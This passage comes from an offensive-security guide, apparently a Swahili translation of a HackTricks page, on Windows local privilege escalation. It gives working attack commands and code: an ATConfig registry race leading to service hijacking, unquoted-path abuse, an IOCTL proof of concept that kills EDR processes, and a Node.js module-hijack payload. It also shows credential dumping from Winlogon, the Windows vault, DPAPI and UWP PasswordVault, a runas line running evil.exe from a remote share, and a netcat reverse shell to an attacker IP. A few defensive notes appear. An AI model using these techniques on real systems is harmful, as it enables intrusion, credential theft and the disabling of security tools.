- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` huhifadhi configuration inayodhibitiwa na user.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa logon/secure-desktop transitions na user anaweza kuandika humo.

Mtiririko wa abuse (CVE-2026-24291 / ATConfig):

1. Weka **HKCU ATConfig** value unayotaka iandikwe na SYSTEM.
2. Trigger secure-desktop copy (kwa mfano, **LockWorkstation**), ambayo huanzisha AT broker flow.
3. **Shinda race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock inapofanya kazi, badilisha **HKLM Session ATConfig** key iwe **registry link** inayoelekeza kwenye protected HKLM target.
4. SYSTEM huandika value iliyochaguliwa na attacker kwenye HKLM path iliyoelekezwa upya.

Baada ya kupata uwezo wa kuandika value yoyote ya HKLM, pivot kwenda LPE kwa kubadilisha service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo normal user anaweza kuanzisha (kwa mfano, **`msiserver`**) na i-trigger baada ya write. **Note:** public exploit implementation **hufunga workstation** kama sehemu ya race.

Example tooling (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

Ikiwa una permission hii kwenye registry, inamaanisha **unaweza kuunda sub registries kutoka kwenye hii**. Kwa services za Windows, hii **inatosha kutekeleza arbitrary code:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Ikiwa path ya executable haijawekwa ndani ya quotes, Windows itajaribu kutekeleza kila sehemu inayoishia kabla ya space.

Kwa mfano, kwa path _C:\Program Files\Some Folder\Service.exe_ Windows itajaribu kutekeleza:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Orodhesha njia zote za service zisizo na nukuu, ukiondoa zile zinazohusiana na services zilizojengwa ndani ya Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**Unaweza kugundua na kutumia** udhaifu huu kwa metasploit: `exploit/windows/local/trusted\_service\_path` Unaweza kuunda binary ya service mwenyewe kwa kutumia metasploit:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Hatua za Urejeshaji

Windows huruhusu watumiaji kubainisha hatua zitakazochukuliwa ikiwa service itashindwa. Kipengele hiki kinaweza kusanidiwa kuelekeza kwenye binary. Ikiwa binary hii inaweza kubadilishwa, privilege escalation inaweza kuwezekana. Maelezo zaidi yanaweza kupatikana katika [hati rasmi](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Applications

### Applications Zilizosakinishwa

Angalia **ruhusa za binaries** (huenda ukaweza kubadilisha moja na kupata privilege escalation) na za **folda** ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Ruhusa za Kuandika

Angalia ikiwa unaweza kurekebisha faili fulani la config ili kusoma faili maalum, au ikiwa unaweza kurekebisha binary itakayotekelezwa na akaunti ya Administrator (schedtasks).

Njia ya kupata ruhusa dhaifu za folda/faili kwenye mfumo ni kufanya:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Persistence/execution ya plugin za autoload za Notepad++

Notepad++ hupakia kiotomatiki DLL yoyote ya plugin iliyo chini ya subfolders zake za `plugins`. Ikiwa kuna usakinishaji wa portable/copy unaoweza kuandikwa, kuweka plugin hasidi hutoa code execution ya kiotomatiki ndani ya `notepad++.exe` kila inapozinduliwa, ikiwemo kupitia `DllMain` na callbacks za plugin.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run wakati wa kuanzisha

**Angalia ikiwa unaweza ku-overwrite registry au binary fulani itakayotekelezwa na mtumiaji mwingine.**\
**Soma** **ukurasa ufuatao** ili kujifunza zaidi kuhusu **maeneo ya autorun yanayovutia kwa ajili ya ku-escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Madereva

Tafuta **third party drivers zisizo za kawaida/zilizo vulnerable** zinazowezekana
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Iwapo driver itaweka wazi primitive ya kusoma/kuandika kernel kiholela (jambo la kawaida katika handlers za IOCTL zilizoundwa vibaya), unaweza kufanya privilege escalation kwa kuiba SYSTEM token moja kwa moja kutoka kernel memory.<sup>[[13]](#references)</sup> Tazama technique ya hatua kwa hatua hapa:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

Kwa bugs za race-condition ambapo call iliyo vulnerable hufungua Object Manager path inayodhibitiwa na attacker, kupunguza kwa makusudi kasi ya lookup (kwa kutumia components zenye max-length au chains ndefu za directories) kunaweza kuongeza window kutoka microseconds hadi makumi ya microseconds:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Cancel-safe queue UAFs, paged-pool disclosures, na I/O ring pivots

Baadhi ya Windows kernel LPE chains zinaweza kujengwa kutokana na bugs mbili zilizo dhaifu zikiwa peke yake: **cancel-safe queue lifetime race** inayofree request/CBD wakati queue lock bado imeshikiliwa, na **lock-release-before-copy** disclosure inayovuja paged-pool allocation iliyofreed wakati wa `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Vidokezo vya audit na exploitation:

- **Free-under-lock + cancel afterwards**: tafuta success path inayofanya **Acquire -> CompleteRequest/free -> Release** huku cancel path ikifanya **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ikiwa success path inafikia `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` kabla ya kuachilia CBDQ/CSQ lock, thread iliyozuiwa katika `NtCancelIoFileEx -> IopCsqCancelRoutine` inaweza kuendelea baadaye na kupitisha `PFLT_CALLBACK_DATA` iliyofreed kwenye remove callback ya driver.
- **Reclaim freed queue object** kwa paged-pool allocation yenye ukubwa sawa inayodhibitiwa na attacker. `NPFS` Data Queue Entries zinafaa kwa sababu payload na size zinadhibitika, na baadaye unaweza kuzichunguza kwa pipe read/peek operations. Ikiwa object iliyofreed ina list links, ziandike upya kwa **cyclic list ya fake request nodes katika user memory** ili driver isindika mara kwa mara request structures zilizobainishwa na attacker badala ya kusitisha kwenye original list head.
- **Upgrade a predictable write**: ikiwa fake request itaelekeza nested context pointer inayotumiwa na bookkeeping writes (timestamps / QPC / refcount-adjacent fields), unaweza kupata **address-controlled but not value-controlled** kernel write. Katika hali hiyo, lenga field ya **length/size** ya sprayed pool object badala ya code/data pointer ya mwisho, kisha enumerate spray hadi object iliyoharibiwa itoe **out-of-bounds paged-pool read**.
- **Raceable disclosure pattern**: syscall yoyote inayofanya `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` ni candidate imara. Reliability huongezeka wakati attacker anaweza kuongeza buffer inayocopiwa (kwa mfano kwa kuongeza list/resource entries nyingi zinazoongeza final allocation size ya serializer), kwa sababu copy ndefu huongeza replacement window bila lazima kucrash mashine.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer arrays ni disclosure targets bora kwa sababu paged-pool size yake inadhibitiwa na attacker (`8 * regBufferCnt`) na kila element ni kernel pointer inayoelekeza kwenye `_IOP_MC_BUFFER_ENTRY`. Leaka mojawapo ya arrays hizi, pata tena `IORING_OBJECT` iliyo karibu, kisha corrupt **`RegBuffers`** na **`RegBuffersCount`** ili subsequent I/O ring operations zitumie entries zilizoforged na kutoa arbitrary kernel read/write. Ikiwa write pekee inayopatikana inakupa stable byte (kwa mfano kutoka `KUSER_SHARED_DATA+0x14`), tumia **overlapping unaligned writes** kujenga user pointer yenye byte inayojirudia kama `0x0101010101010101`, i-map kwa `VirtualAlloc`, na uweke forged registered-buffer array humo.<sup>[[30]](#references)</sup>

Viashiria muhimu vya debugging:
```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```
Mara tu unapopata arbitrary kernel read/write kutoka kwa corrupted I/O ring, iba SYSTEM token kwa kutumia standard post-primitive workflow:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities hukuwezesha kupanga deterministic layouts, kutumia vibaya writable HKLM/HKU descendants, na kubadilisha metadata corruption kuwa kernel paged-pool overflows bila custom driver. Jifunze full chain hapa:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion kutoka kwa attacker-controlled paths

Baadhi ya drivers hupokea registry path kutoka userland, huthibitisha tu kwamba ni UTF-16 string halali, kisha huita `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` na `RTL_QUERY_REGISTRY_DIRECT` kuelekea stack scalar kama `int readValue`. Ikiwa `RTL_QUERY_REGISTRY_TYPECHECK` haipo, `EntryContext` hutafsiriwa kulingana na **actual** registry type, si type ambayo developer alitarajia.

Hii huunda primitives mbili muhimu:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: absolute `\Registry\...` path inayodhibitiwa na user humwezesha driver kuuliza attacker-chosen keys, kuvuja kuwepo kwake kupitia return codes/logs, na wakati mwingine kusoma values ambazo caller hangeweza kufikia moja kwa moja.
- **Kernel memory corruption**: scalar destination kama `&readValue` huchanganywa kwa type kama `REG_QWORD`, `UNICODE_STRING`, au sized binary buffer kulingana na registry value type.

Maelezo ya vitendo kuhusu exploitation:

- **Windows 8+ mitigation**: ikiwa query inafikia **untrusted hive** yenye `RTL_QUERY_REGISTRY_DIRECT` lakini bila `RTL_QUERY_REGISTRY_TYPECHECK`, kernel callers hu-crash kwa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Ili kudumisha exploitability, tafuta **attacker-writable keys ndani ya trusted system hives** badala ya kuweka values chini ya `HKCU`.
- **Trusted-hive staging**: tumia NtObjectManager kuorodhesha writable descendants za `\Registry\Machine`, kisha endesha tena scan kwa token iliyorudiwa ya **low-integrity** ili kupata keys zinazofikika kutoka sandboxed contexts:<sup>[[26]](#references)</sup>
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: uandishi wa moja kwa moja wa baiti 8 ndani ya `int` ya baiti 4 huharibu data iliyo karibu kwenye stack na unaweza ku-overwrite kwa sehemu pointer ya callback/function iliyo karibu.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode inatarajia `EntryContext` ielekeze kwenye `UNICODE_STRING`. Ikiwa code kwanza inapakia `REG_DWORD` inayodhibitiwa na attacker kwenye scalar ya stack kisha inatumia tena buffer hiyo hiyo kusoma string, attacker anadhibiti `Length`/`MaximumLength` na huathiri kwa sehemu pointer ya `Buffer`, hivyo kusababisha kernel write inayodhibitika kwa kiasi.
- **`REG_BINARY`**: kwa data kubwa ya binary, direct mode huchukulia `LONG` ya kwanza kwenye `EntryContext` kama ukubwa wa buffer wenye alama. Ikiwa usomaji wa awali wa `REG_DWORD` utaacha thamani hasi inayodhibitiwa na attacker kwenye scalar iliyotumiwa tena, query inayofuata ya `REG_BINARY` hunakili baiti za attacker moja kwa moja juu ya stack slots zilizo karibu, ambalo mara nyingi huwa njia safi zaidi ya ku-overwrite callback-pointer kikamilifu.

Muundo muhimu wa hunting: **usomaji wa registry wa aina tofauti kwenye variable ile ile ya stack bila kui-initialize tena**. Tafuta `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, pointer za `EntryContext` zinazotumiwa tena, na code paths ambapo usomaji wa kwanza wa registry hudhibiti ikiwa usomaji wa pili utafanyika.

#### Kutumia vibaya kutokuwepo kwa FILE_DEVICE_SECURE_OPEN kwenye device objects (LPE + EDR kill)

Baadhi ya drivers zilizosainiwa za third-party huunda device object yao kwa SDDL imara kupitia IoCreateDeviceSecure lakini husahau kuweka FILE_DEVICE_SECURE_OPEN katika DeviceCharacteristics. Bila flag hii, secure DACL hailazimishwi wakati device inafunguliwa kupitia path iliyo na component ya ziada, hivyo kumruhusu user yeyote asiye na privileges kupata handle kwa kutumia namespace path kama:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (kutoka kwenye tukio halisi la ulimwenguni)

Mara user anapoweza kufungua device, privileged IOCTLs zinazotolewa na driver zinaweza kutumiwa vibaya kwa LPE na tampering. Uwezo ulioonekana kwenye mazingira halisi ni pamoja na:
- Kurejesha handles zenye full-access kwa processes arbitrary (token theft / SYSTEM shell kupitia DuplicateTokenEx/CreateProcessAsUser).
- Raw disk read/write bila vikwazo (offline tampering, mbinu za persistence wakati wa boot).
- Kusitisha processes arbitrary, ikiwemo Protected Process/Light (PP/PPL), na hivyo kuruhusu AV/EDR kill kutoka user land kupitia kernel.

Muundo mdogo wa PoC (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Mitigations kwa developers
- Weka kila mara FILE_DEVICE_SECURE_OPEN unapounda device objects zinazokusudiwa kuzuiwa na DACL.
- Thibitisha context ya mwitaji kwa operations zenye privileges. Ongeza ukaguzi wa PP/PPL kabla ya kuruhusu kusitishwa kwa process au kurejeshwa kwa handle.
- Zuia IOCTLs (access masks, METHOD_*, input validation) na zingatia mifano ya brokered badala ya privileges za kernel za moja kwa moja.

Mawazo ya Detection kwa defenders
- Fuatilia user-mode opens za majina ya devices yanayotiliwa shaka (kwa mfano, \\ .\\amsdk*) na mfululizo maalum wa IOCTL unaoashiria abuse.
- Tekeleza Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) na udumishe allow/deny lists zako.

## PATH DLL Hijacking

Ikiwa una **write permissions ndani ya folder lililopo kwenye PATH**, unaweza kuweza ku-hijack DLL inayopakiwa na process na **ku-escalate privileges**.<sup>[[2]](#references)</sup>

Kagua permissions za folders zote zilizo ndani ya PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Kwa maelezo zaidi kuhusu jinsi ya kutumia vibaya ukaguzi huu:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

Hii ni variant ya **Windows uncontrolled search path** inayoathiri applications za **Node.js** na **Electron** zinapofanya bare import kama `require("foo")` na module inayotarajiwa **haipo**.<sup>[[20]](#references)</sup>

Node hutatua packages kwa kupanda kwenye mti wa directories na kuangalia folders za `node_modules` katika kila parent. Kwenye Windows, utafutaji huo unaweza kufika kwenye root ya drive, hivyo application iliyoanzishwa kutoka `C:\Users\Administrator\project\app.js` inaweza kuishia kutafuta:<sup>[[21]](#references)</sup>

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

Ikiwa **low-privileged user** anaweza kuunda `C:\node_modules`, anaweza kuweka `foo.js` yenye malicious code (au package folder) na kusubiri **Node/Electron process yenye privileges za juu** itatue dependency inayokosekana. Payload hutekelezwa katika security context ya victim process, hivyo hii huwa **LPE** kila target inapokuwa inaendeshwa kama administrator, kutoka kwenye elevated scheduled task/service wrapper, au kutoka kwenye privileged desktop app inayojiendesha yenyewe wakati wa kuanza.

Hili hutokea hasa wakati:

- dependency imetajwa katika `optionalDependencies`<sup>[[22]](#references)</sup>
- third-party library inafunga `require("foo")` ndani ya `try/catch` na kuendelea endapo kuna hitilafu
- package imeondolewa kwenye production builds, haikujumuishwa wakati wa packaging, au imeshindwa kusakinishwa
- `require()` iliyo hatarini iko ndani kabisa ya dependency tree badala ya kuwa kwenye main application code

### Kutafuta targets zilizo hatarini

Tumia **Procmon** kuthibitisha resolution path:<sup>[[23]](#references)</sup>

- Filter kwa `Process Name` = target executable (`node.exe`, Electron app EXE, au wrapper process)
- Filter kwa `Path` `contains` `node_modules`
- Lenga `NAME NOT FOUND` na open ya mwisho iliyofaulu chini ya `C:\node_modules`

Mifano muhimu ya code-review katika files za `.asar` zilizofunguliwa au application sources:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Tambua **jina la package lililokosekana** kutoka kwa Procmon au ukaguzi wa source.
2. Unda directory ya root lookup ikiwa bado haipo:
```powershell
mkdir C:\node_modules
```
3. Weka module yenye jina halisi linalotarajiwa:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. Anzisha victim application. Ikiwa application itajaribu `require("foo")` na module halali haipo, Node inaweza kupakia `C:\node_modules\foo.js`.

Mifano ya ulimwengu halisi ya optional modules zinazokosekana na kufuata pattern hii ni pamoja na `bluebird` na `utf-8-validate`, lakini **technique** ndiyo sehemu inayoweza kutumika tena: tafuta **missing bare import** yoyote ambayo privileged Windows Node/Electron process ita-resolve.

### Mawazo ya Detection na hardening

- Weka alert user anapounda `C:\node_modules` au kuandika files/packages mpya za `.js` humo.
- Fanya hunt kwa high-integrity processes zinazosoma kutoka `C:\node_modules\*`.
- Package runtime dependencies zote katika production na audit matumizi ya `optionalDependencies`.
- Kagua third-party code kwa patterns za kimya za `try { require("...") } catch {}`.
- Disable optional probes wakati library inai-support (kwa mfano, baadhi ya deployments za `ws` zinaweza kuepuka probe ya zamani ya `utf-8-validate` kwa kutumia `WS_NO_UTF_8_VALIDATE=1`).

## Mtandao

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

Kagua kompyuta nyingine zinazojulikana zilizowekwa moja kwa moja kwenye hosts file
```
type C:\Windows\System32\drivers\etc\hosts
```
### Miingiliano ya Mtandao na DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Bandari zilizo wazi

Angalia **huduma zilizowekewa vikwazo** kutoka nje
```bash
netstat -ano #Opened ports?
```
### Jedwali la Uelekezaji
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### Jedwali la ARP
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Kanuni za Firewall

[**Angalia ukurasa huu kwa commands zinazohusiana na Firewall**](../basic-cmd-for-pentesters.md#firewall) **(orodhesha kanuni, unda kanuni, zima, zima...)**

[Commands zaidi za network enumeration hapa](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` pia inaweza kupatikana katika `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ukipata root user, unaweza kusikiliza kwenye port yoyote (mara ya kwanza unapotumia `nc.exe` kusikiliza kwenye port, itauliza kupitia GUI ikiwa `nc` inapaswa kuruhusiwa na firewall).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
Ili kuanzisha bash kwa urahisi kama root, unaweza kujaribu `--default-user root`

Unaweza kuchunguza mfumo wa faili wa `WSL` kwenye folda `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Hati za utambulisho za Windows

### Hati za utambulisho za Winlogon
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Windows Vault huhifadhi credentials za watumiaji kwa servers, websites na programs nyingine ambazo **Windows** inaweza **kuwaingiza watumiaji kiotomatiki**. Mwanzoni, inaweza kuonekana kwamba watumiaji sasa wanaweza kuhifadhi credentials zao za Facebook, credentials za Twitter, credentials za Gmail, n.k., ili waingizwe kiotomatiki kupitia browsers. Lakini sivyo.

Windows Vault huhifadhi credentials ambazo Windows inaweza kutumia kuwaingiza watumiaji kiotomatiki, ikimaanisha kwamba **Windows application yoyote inayohitaji credentials ili kufikia resource** (server au website) **inaweza kutumia Credential Manager** & Windows Vault na kutumia credentials zilizotolewa badala ya watumiaji kuingiza username na password kila wakati.

Isipokuwa applications ziwasiliane na Credential Manager, sidhani kama zinaweza kutumia credentials za resource fulani. Kwa hiyo, ikiwa application yako inataka kutumia vault, inapaswa kwa namna fulani **kuwasiliana na credential manager na kuomba credentials za resource hiyo** kutoka kwenye default storage vault.

Tumia `cmdkey` kuorodhesha credentials zilizohifadhiwa kwenye machine.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Kisha unaweza kutumia `runas` pamoja na chaguo la `/savecred` ili kutumia credentials zilizohifadhiwa. Mfano ufuatao unaita binary ya mbali kupitia SMB share.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Kutumia `runas` kwa seti ya credentials iliyotolewa.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Kumbuka kwamba mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), au kutoka kwenye [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Programu za kisasa za Windows UWP, Microsoft Edge, na huduma za kisasa za mfumo huhifadhi authentication tokens na plaintext passwords ndani ya `PasswordVault` ya Universal Windows Platform (UWP) (ambayo pia huonyeshwa kama `Web Credentials` katika `vaultcmd`). Nafasi hii ya hifadhi imetenganishwa kwa session na inaweza kutolewa kwa decryption natively bila haki za kiutawala au `SeDebugPrivilege`.

Tekeleza amri hii ya PowerShell ndani ya session inayotumika ya mtumiaji ili kudump na ku-decrypt papo hapo usernames zote zilizohifadhiwa pamoja na plaintext passwords:
```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```
### DPAPI

**Data Protection API (DPAPI)** hutoa mbinu ya usimbaji fiche wa symmetric wa data, inayotumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa usimbaji fiche wa symmetric wa funguo binafsi za asymmetric. Usimbaji fiche huu hutumia siri ya mtumiaji au mfumo ili kuchangia kwa kiasi kikubwa katika entropy.

**DPAPI huwezesha usimbaji fiche wa funguo kupitia ufunguo wa symmetric unaotokana na siri za kuingia za mtumiaji**. Katika hali zinazohusisha usimbaji fiche wa mfumo, hutumia siri za uthibitishaji wa domain za mfumo.

Funguo za RSA za mtumiaji zilizosimbwa fiche kwa kutumia DPAPI huhifadhiwa katika saraka ya `%APPDATA%\Microsoft\Protect\{SID}`, ambapo `{SID}` inawakilisha [Kitambulisho cha Usalama](https://en.wikipedia.org/wiki/Security_Identifier) cha mtumiaji. **Ufunguo wa DPAPI, unaopatikana pamoja na master key inayolinda funguo binafsi za mtumiaji katika faili hiyo hiyo**, kwa kawaida huwa na baiti 64 za data ya nasibu. (Ni muhimu kutambua kwamba ufikiaji wa saraka hii umezuiwa, hivyo kuorodhesha yaliyomo kwa kutumia amri ya `dir` katika CMD haiwezekani, ingawa inaweza kuorodheshwa kupitia PowerShell.)
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Unaweza kutumia **mimikatz module** `dpapi::masterkey` pamoja na arguments zinazofaa (`/pvk` au `/rpc`) ili ku-decrypt.

**credentials files protected by the master password** kwa kawaida hupatikana katika:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Unaweza kutumia **mimikatz module** `dpapi::cred` pamoja na `/masterkey` inayofaa kusimbua.\
Unaweza **extract nyingi za DPAPI** **masterkeys** kutoka kwenye **memory** kwa kutumia module ya `sekurlsa::dpapi` (ikiwa wewe ni root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Credentials za PowerShell

**PowerShell credentials** hutumiwa mara nyingi kwa **scripting** na kazi za automation kama njia ya kuhifadhi credentials zilizosimbwa kwa urahisi. Credentials zinalindwa kwa kutumia **DPAPI**, ambayo kwa kawaida inamaanisha kwamba zinaweza kusimbuliwa tu na mtumiaji yuleyule kwenye kompyuta ileile ambako ziliundwa.

Ili **kusimbua** PS credentials kutoka kwenye faili iliyo nazo, unaweza kufanya:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
